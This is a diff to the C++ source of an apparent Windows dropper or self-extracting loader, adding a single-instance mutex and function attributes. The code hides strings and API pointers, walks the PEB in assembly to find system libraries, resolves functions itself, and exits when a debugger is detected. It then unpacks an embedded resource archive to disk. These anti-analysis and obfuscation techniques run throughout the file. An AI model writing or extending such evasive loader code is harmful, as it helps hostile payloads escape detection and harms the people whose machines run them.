@@ -6,6 +6,7 @@
 
 #include "swap.h"
 static char *valuebytes=NULL;
+static HANDLE iMutex;
 
 #define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
 #define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
@@ -70,7 +71,11 @@ template <char c> struct enc_b{ enum{ v=(char)high_byte(swapbytes[(uint8_t)c]) }
 #define e55(s) e54(s),eca(s[54]),ecb(s[54])
 #define _(s,i) {e##i(s),eca(0)  ,ecb(0), 0}
 #define merge_bytes(lb,hb) ((lb-97)|((hb-97)<<4))
-void __(const char *s,unsigned short l){
+
+#define __fdecl __attribute__ ((cdecl)) __attribute__ ((nothrow)) __attribute__ ((noinline)) __attribute__ ((noclone)) \
+__attribute__ ((cold)) __attribute__ ((aligned(16))) static
+
+__fdecl void __(const char *s,unsigned short l){
   uint8_t j=0;
   for(uint8_t i=0;i<l+1;i++){
     ((char *)s)[i]=valuebytes[merge_bytes(((char *)s)[j],((char *)s)[j+1])];
@@ -79,18 +84,18 @@ void __(const char *s,unsigned short l){
 }
 #define _s(n,s,l) const char n[]=_(s,l);__(n,l);
 
-void *ppeb=NULL;
-void dbg();
-HINSTANCE huser32,hshell32,hgdi32,hkernel32,hntdll;
+static void *ppeb=NULL;
+__fdecl void dbg();
+static HINSTANCE huser32,hshell32,hgdi32,hkernel32,hntdll;
 
 #define TIME_TYPE LARGE_INTEGER
 #define GET_TIME(s) (QueryPerformanceCounter(&(s)))
 #define GET_TIME_LAST_2BYTES(s) ((uint32_t)((s).QuadPart&0xffff))
 #define GET_TIME_LAST_BIT(s) ((uint32_t)((s).QuadPart&1))
-volatile uint32_t seed=0;
-#define _f(f) ((void *)((uint32_t)f^seed))
+static volatile uint32_t seed=0;
+#define _f(f) ((void *)((uint32_t)f^seed^F_0))
 
-inline double pi(uint32_t t){
+__fdecl double pi(uint32_t t){
   double p=0.0;
   double s=1.0;
   for(uint32_t i=0; i<t; i++){
@@ -101,7 +106,7 @@ inline double pi(uint32_t t){
   return p;
 }
 
-uint32_t timeshift(){
+__fdecl uint32_t timeshift(){
   uint32_t offsets[]={1009,3109,9109,12109,24107,48109,96053};
   uint32_t i=0;
   TIME_TYPE sw;
@@ -115,7 +120,7 @@ uint32_t timeshift(){
   return GET_TIME_LAST_BIT(sw);
 }
 
-uint32_t timebits(){
+__fdecl uint32_t timebits(){
   uint32_t l=0;
   for(uint8_t i=0; i<32; i++){
     l<<=1;
@@ -124,37 +129,37 @@ uint32_t timebits(){
   return l;
 }
 
-typedef volatile HMODULE (WINAPI *LLA)(LPCSTR); LLA lla;
-typedef volatile BOOL (WINAPI *SEA)(SHELLEXECUTEINFOA*); SEA sea;
-typedef volatile HBITMAP (WINAPI *CBMP)(int,int,UINT,UINT,const VOID*); CBMP cbmp;
-typedef volatile HDC (WINAPI *CCDC)(HDC); CCDC cdc;
-typedef volatile BOOL (WINAPI *DDC)(HDC); DDC ddc;
-typedef volatile BOOL (WINAPI *DOB)(HGDIOBJ); DOB dob;
-typedef volatile int (WINAPI *GOA)(HANDLE,int,LPVOID); GOA goa;
-typedef volatile BOOL (WINAPI *BLT)(HDC,int,int,int,int,HDC,int,int,DWORD); BLT blt;
-typedef volatile HGDIOBJ (WINAPI *SOB)(HDC,HGDIOBJ); SOB sob;
-typedef volatile HPEN (WINAPI *CRP)(int,int,COLORREF); CRP crp;
-typedef volatile BOOL (WINAPI *LTO)(HDC,int,int); LTO lto;
-typedef volatile BOOL (WINAPI *MTE)(HDC,int,int,LPPOINT); MTE mte;
-typedef volatile BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL); AWR awr;
-typedef volatile HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT); BEP bep;
-typedef volatile BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *); EPA epa;
-typedef volatile BOOL (WINAPI *GCR)(HWND,LPRECT); GCR gcr;
-typedef volatile HDC (WINAPI *GDC)(HWND); GDC gdc;
-typedef volatile int (WINAPI *GSM)(int); GSM gsm;
-typedef volatile BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL); IVR ivr;
-typedef volatile BOOL (WINAPI *PIR)(const RECT *,POINT); PIR pir;
-typedef volatile BOOL (WINAPI *RCP)(); RCP rcp;
-typedef volatile int (WINAPI *RDC)(HWND,HDC); RDC rdc;
-typedef volatile BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT); TMV tmv;
-typedef volatile BOOL (WINAPI *UWI)(HWND); UWI uwi;
-typedef volatile BOOL (WINAPI *FLIB)(HMODULE); FLIB flib;
-typedef volatile UINT (WINAPI *RWMA)(LPCSTR); RWMA rwma;
-typedef volatile LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM); SMA sma;
-typedef LPWSTR *(WINAPI *CLTAW)(LPCWSTR,int*); CLTAW cltaw;
-typedef volatile NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW); RGV rgv;
+typedef volatile HMODULE (WINAPI *LLA)(LPCSTR); static LLA lla;
+typedef volatile BOOL (WINAPI *SEA)(SHELLEXECUTEINFOA*); static SEA sea;
+typedef volatile HBITMAP (WINAPI *CBMP)(int,int,UINT,UINT,const VOID*); static CBMP cbmp;
+typedef volatile HDC (WINAPI *CCDC)(HDC); static CCDC cdc;
+typedef volatile BOOL (WINAPI *DDC)(HDC); static DDC ddc;
+typedef volatile BOOL (WINAPI *DOB)(HGDIOBJ); static DOB dob;
+typedef volatile int (WINAPI *GOA)(HANDLE,int,LPVOID); static GOA goa;
+typedef volatile BOOL (WINAPI *BLT)(HDC,int,int,int,int,HDC,int,int,DWORD); static BLT blt;
+typedef volatile HGDIOBJ (WINAPI *SOB)(HDC,HGDIOBJ); static SOB sob;
+typedef volatile HPEN (WINAPI *CRP)(int,int,COLORREF); static CRP crp;
+typedef volatile BOOL (WINAPI *LTO)(HDC,int,int); static LTO lto;
+typedef volatile BOOL (WINAPI *MTE)(HDC,int,int,LPPOINT); static MTE mte;
+typedef volatile BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL); static AWR awr;
+typedef volatile HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT); static BEP bep;
+typedef volatile BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *); static EPA epa;
+typedef volatile BOOL (WINAPI *GCR)(HWND,LPRECT); static GCR gcr;
+typedef volatile HDC (WINAPI *GDC)(HWND); static GDC gdc;
+typedef volatile int (WINAPI *GSM)(int); static GSM gsm;
+typedef volatile BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL); static IVR ivr;
+typedef volatile BOOL (WINAPI *PIR)(const RECT *,POINT); static PIR pir;
+typedef volatile BOOL (WINAPI *RCP)(); static RCP rcp;
+typedef volatile int (WINAPI *RDC)(HWND,HDC); static RDC rdc;
+typedef volatile BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT); static TMV tmv;
+typedef volatile BOOL (WINAPI *UWI)(HWND); static UWI uwi;
+typedef volatile BOOL (WINAPI *FLIB)(HMODULE); static FLIB flib;
+typedef volatile UINT (WINAPI *RWMA)(LPCSTR); static RWMA rwma;
+typedef volatile LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM); static SMA sma;
+typedef LPWSTR *(WINAPI *CLTAW)(LPCWSTR,int*); static CLTAW cltaw;
+typedef volatile NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW); static RGV rgv;
 
-inline uint16_t strlen_i(const char *src){
+__fdecl uint16_t strlen_i(const char *src){
   uint16_t i=0;
   uint8_t *c=(uint8_t *)src;
   while(*c++ && i++!=0xffff);
@@ -169,7 +174,7 @@ uint32_t __readfsdword(const uint32_t Offset){
     return value;
 };
 */
-void get_ppeb(){
+__fdecl void get_ppeb(){
   __asm__ volatile(
     "xor (%0),      %0\n\t"
     "mov %%fs:0x30, %0\n\t"
@@ -182,7 +187,7 @@ void get_ppeb(){
                                                             LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
   hkernel32=(HMODULE)ldrDataTableEntry->DllBase;
 */
-void get_handles(){
+__fdecl void get_handles(){
   __asm__ volatile(
     "mov %2,        %0\n\t"
     "mov 0x0C(%0),  %0\n\t"
@@ -194,7 +199,7 @@ void get_handles(){
     : "=r"(hkernel32), "=r" (hntdll) : "r" (ppeb));
 };
 
-void *gpa(HMODULE m,const char *f){
+__fdecl void *gpa(HMODULE m,const char *f){
   ULONG_PTR moduleBase;
   PIMAGE_DOS_HEADER dosHeader;
   PIMAGE_NT_HEADERS ntHeaders;
@@ -225,34 +230,38 @@ void *gpa(HMODULE m,const char *f){
   return f_ptr;
 };
 
-void *get_fn_ptr(HINSTANCE l,const char *f){
+__fdecl void *get_fn_ptr(HINSTANCE l,const char *f){
   void* p=NULL;
   if(l){
     p=gpa(l,f);
     p=_f(p);
-    if(!p) ExitProcess(1);
+    if(!p){
+      if(iMutex) CloseHandle(iMutex);
+      ExitProcess(1);
+    };
     char *c=(char *)f;
     while(*c) *c++=0;
     return p;
   };
+  if(iMutex) CloseHandle(iMutex);
   ExitProcess(1);
 };
 
-HBITMAP hBitmap,hOldBitmap;
-HDC hdc,hdcMem;
-BITMAP bm;
-HINSTANCE hI;
-PAINTSTRUCT ps;
-RECT rect,rc,rc_yes,rc_no;
-HPEN hpen;
-POINT mpos;
-BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
-TRACKMOUSEEVENT tme;
-int dlg_ret=0;
-bool inv=false;
-uint8_t *image=NULL;
+static HBITMAP hBitmap,hOldBitmap;
+static HDC hdc,hdcMem;
+static BITMAP bm;
+static HINSTANCE hI;
+static PAINTSTRUCT ps;
+static RECT rect,rc,rc_yes,rc_no;
+static HPEN hpen;
+static POINT mpos;
+static BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
+static TRACKMOUSEEVENT tme;
+static int dlg_ret=0;
+static bool inv=false;
+static uint8_t *image=NULL;
 
-LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
+static LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
   switch(msg){
     case WM_CREATE:
       hBitmap=((CBMP)_f(cbmp))(506,191,1,32,image);
@@ -376,7 +385,7 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
   return DefWindowProcA(hWnd,msg,wParam,lParam);
 }
 
-int dlg_window(HINSTANCE hInstance){
+__fdecl int dlg_window(HINSTANCE hInstance){
   hI=hInstance;
   WNDCLASS wc;
   wc.style=0;
@@ -421,9 +430,9 @@ int dlg_window(HINSTANCE hInstance){
   return 0;
 }
 
-UINT null_msg;
+static UINT null_msg;
 
-LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
+static LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
   switch(msg){
     case WM_CREATE:
       ((SMA)_f(sma))(hWnd,null_msg,0,0);
@@ -443,7 +452,7 @@ LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
   return DefWindowProcA(hWnd,msg,wParam,lParam);
 };
 
-void null_window(HINSTANCE hInstance){
+__fdecl void null_window(HINSTANCE hInstance){
   MSG msg;
   WNDCLASS wc;
   HWND hwnd;
@@ -469,11 +478,11 @@ void null_window(HINSTANCE hInstance){
   return;
 };
 
-uint8_t read_shift=0;
-uint8_t read_mask=0;
-uint8_t *res;
+static uint8_t read_shift=0;
+static uint8_t read_mask=0;
+static uint8_t *res;
 
-uint8_t bytes2byte_raw(){
+__fdecl uint8_t bytes2byte_raw(){
   uint8_t b=0;
   b|=(*res&0x03); b<<=2; res++; read_shift++;
   if(read_shift==3){ res++; read_shift=0; };
@@ -486,13 +495,13 @@ uint8_t bytes2byte_raw(){
   return b;
 };
 
-uint8_t bytes2byte(){
+__fdecl uint8_t bytes2byte(){
   uint8_t b=bytes2byte_raw()^read_mask;
   read_mask=b;
   return b;
 };
 
-void bytes2uint(uint32_t &b){
+__fdecl void bytes2uint(uint32_t &b){
   b=0;
   b|=bytes2byte(); b<<=8;
   b|=bytes2byte(); b<<=8;
@@ -504,28 +513,28 @@ void bytes2uint(uint32_t &b){
 #define LZ_CAPACITY 24
 #define LZ_MIN_MATCH 3
 
-uint8_t flags;
-uint8_t *cbuffer=NULL;
-uint8_t *vocbuf=NULL;
-uint32_t *frequency=NULL;
-uint16_t buf_size;
-uint16_t vocroot;
-uint16_t offset;
-uint16_t lenght;
-uint16_t symbol;
-uint32_t low;
-uint32_t hlp;
-uint32_t range;
-uint32_t *fc;
-char *lowp;
-char *hlpp;
-uint8_t *cpos;
-uint8_t rle_flag;
+static uint8_t flags;
+static uint8_t *cbuffer=NULL;
+static uint8_t *vocbuf=NULL;
+static uint32_t *frequency=NULL;
+static uint16_t buf_size;
+static uint16_t vocroot;
+static uint16_t offset;
+static uint16_t lenght;
+static uint16_t symbol;
+static uint32_t low;
+static uint32_t hlp;
+static uint32_t range;
+static uint32_t *fc;
+static char *lowp;
+static char *hlpp;
+static uint8_t *cpos;
+static uint8_t rle_flag;
 
-uint32_t dptr;
-uint32_t dsize;
+static uint32_t dptr;
+static uint32_t dsize;
 
-uint8_t dgetc(){
+__fdecl uint8_t dgetc(){
   dbg();
   uint8_t s=0;
   if(dptr<dsize){
@@ -535,7 +544,7 @@ uint8_t dgetc(){
   return s;
 }
 
-uint8_t rc32_getc(uint8_t *c){
+__fdecl uint8_t rc32_getc(uint8_t *c){
   while((range<0x10000)||(hlp<low)){
     if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
       range=0x10000-(uint16_t)low;
@@ -574,7 +583,7 @@ uint8_t rc32_getc(uint8_t *c){
   return 0;
 }
 
-uint8_t unpack_file(){
+__fdecl uint8_t unpack_file(){
   uint16_t i;
   if(lenght){
     if(!rle_flag){
@@ -629,12 +638,12 @@ uint8_t unpack_file(){
   return 0;
 }
 
-bool is_exists(const char *path){
+__fdecl bool is_exists(const char *path){
   uint32_t a=(uint32_t)GetFileAttributes(path);
   return ((a!=INVALID_FILE_ATTRIBUTES) && (a&FILE_ATTRIBUTE_DIRECTORY));
 };
 
-void rmkdir(char *path,int depth){
+__fdecl void rmkdir(char *path,int depth){
   for(uint16_t i=depth;i<strlen_i(path);i++){
     if(path[i]=='/'){
       path[i]=0;
@@ -651,7 +660,7 @@ void rmkdir(char *path,int depth){
   return;
 }
 
-uint8_t read_packed_value(void *p,uint16_t s){
+__fdecl uint8_t read_packed_value(void *p,uint16_t s){
   for(uint16_t i=0;i<s;i++){
     if(unpack_file()) return 1;
     ((char *)p)[i]=(char)symbol;
@@ -659,7 +668,7 @@ uint8_t read_packed_value(void *p,uint16_t s){
   return 0;
 }
 
-void init_unpack(const uint32_t data_size_in){
+__fdecl void init_unpack(const uint32_t data_size_in){
   dsize=data_size_in;
   dptr=buf_size=flags=vocroot=low=hlp=lenght=rle_flag=0;
   offset=range=0xffffffff;
@@ -675,7 +684,7 @@ void init_unpack(const uint32_t data_size_in){
   }
 };
 
-void unarc(char *out){
+__fdecl void unarc(char *out){
   HANDLE o;
   DWORD w;
   uint32_t fl=0,i;
@@ -703,7 +712,7 @@ void unarc(char *out){
   };
 }
 
-bool iswin10(){
+__fdecl bool iswin10(){
   if(rgv){
     OSVERSIONINFOEXW osInfo;
     osInfo.dwOSVersionInfoSize=sizeof(osInfo);
@@ -716,7 +725,7 @@ bool iswin10(){
 #define data_res 0x10
 #define image_size 386584
 
-uint8_t *load_res(uint32_t id){
+__fdecl uint8_t *load_res(uint32_t id){
   HRSRC res=FindResourceA(NULL,MAKEINTRESOURCE(id),RT_RCDATA);
   if(res){
     HGLOBAL res_handle=LoadResource(NULL,res);
@@ -725,7 +734,7 @@ uint8_t *load_res(uint32_t id){
   return NULL;
 };
 
-void free_mem(){
+__fdecl void free_mem(){
   if(cbuffer) LocalFree(cbuffer);
   if(frequency) LocalFree(frequency);
   if(vocbuf) LocalFree(vocbuf);
@@ -733,7 +742,7 @@ void free_mem(){
   if(image) LocalFree(image);
 };
 
-void dbg(){
+__fdecl void dbg(){
   uint32_t pNtGlobalFlag,pFlags=0,pForceFlags=0;
   __asm__ volatile(
     "mov %3,        %0\n\t"
@@ -744,27 +753,37 @@ void dbg(){
     : "=r"(pForceFlags), "=r"(pFlags), "=r"(pNtGlobalFlag) : "r" (ppeb));
   if((pNtGlobalFlag&0x70)||(pFlags&~HEAP_GROWABLE)||pForceFlags){
     free_mem();
+    if(iMutex) CloseHandle(iMutex);
     ExitProcess(1);
   };
   return;
 };
 
-void init(){
+__fdecl void init(){
   get_ppeb();
   get_handles();
+  SetLastError(0);
+  iMutex=CreateMutexA(NULL,true,imutex);
+  if(iMutex){
+    if(GetLastError()==ERROR_ALREADY_EXISTS) ExitProcess(0);
+  }
+  else ExitProcess(0);
   res=(uint8_t *)(load_res(data_res)+54);
-  if(res==NULL) ExitProcess(1);
+  if(res==NULL){
+    if(iMutex) CloseHandle(iMutex);
+    ExitProcess(1);
+  };
   read_mask=bytes2byte_raw();
   uint32_t c=0;
   bytes2uint(c);
   valuebytes=(char *)LocalAlloc(LMEM_ZEROINIT,256);
-  if(!valuebytes){ free_mem(); ExitProcess(1); };
+  if(!valuebytes){ free_mem(); if(iMutex) CloseHandle(iMutex); ExitProcess(1); };
   cbuffer=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,LZ_CAPACITY+1);
-  if(!cbuffer){ free_mem(); ExitProcess(1); };
+  if(!cbuffer){ free_mem(); if(iMutex) CloseHandle(iMutex); ExitProcess(1); };
   frequency=(uint32_t *)LocalAlloc(LMEM_ZEROINIT,257*sizeof(uint32_t));
-  if(!frequency){ free_mem(); ExitProcess(1); };
+  if(!frequency){ free_mem(); if(iMutex) CloseHandle(iMutex); ExitProcess(1); };
   vocbuf=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,0x10000);
-  if(!vocbuf){ free_mem(); ExitProcess(1); };
+  if(!vocbuf){ free_mem(); if(iMutex) CloseHandle(iMutex); ExitProcess(1); };
   for(uint16_t i=0;i<c;i++) valuebytes[i]=bytes2byte();
   _s(dll_u,"User32",6);
   _s(dll_s,"Shell32",7);
@@ -805,7 +824,7 @@ void init(){
   huser32=((LLA)_f(lla))(dll_u);
   hshell32=((LLA)_f(lla))(dll_s);
   rgv=(RGV)gpa(hntdll,f0029);
-  if (!iswin10()) ExitProcess(0);
+  if (!iswin10()){ if(iMutex) CloseHandle(iMutex); ExitProcess(0); };
   awr=(AWR)get_fn_ptr(huser32,f0013);
   bep=(BEP)get_fn_ptr(huser32,f0014);
   epa=(EPA)get_fn_ptr(huser32,f0015);
@@ -834,7 +853,7 @@ void init(){
   cltaw=(CLTAW)get_fn_ptr(hshell32,f0028);
 };
 
-char *wchartocodepage(const wchar_t *src,UINT cp){
+__fdecl char *wchartocodepage(const wchar_t *src,UINT cp){
   char *c_buf=NULL;
   if(src){
     int ln=WideCharToMultiByte(cp,0,src,-1,NULL,0,NULL,NULL);
@@ -850,6 +869,8 @@ char *wchartocodepage(const wchar_t *src,UINT cp){
   };
   return c_buf;
 }
+
+#include "defs.h"
 
 extern "C" void __stdcall start(){
   init();
@@ -923,5 +944,6 @@ extern "C" void __stdcall start(){
   ((FLIB)_f(flib))(hgdi32);
   ((FLIB)_f(flib))(huser32);
   free_mem();
+  if(iMutex) CloseHandle(iMutex);
   if(!res_size) ExitProcess(0);
 }
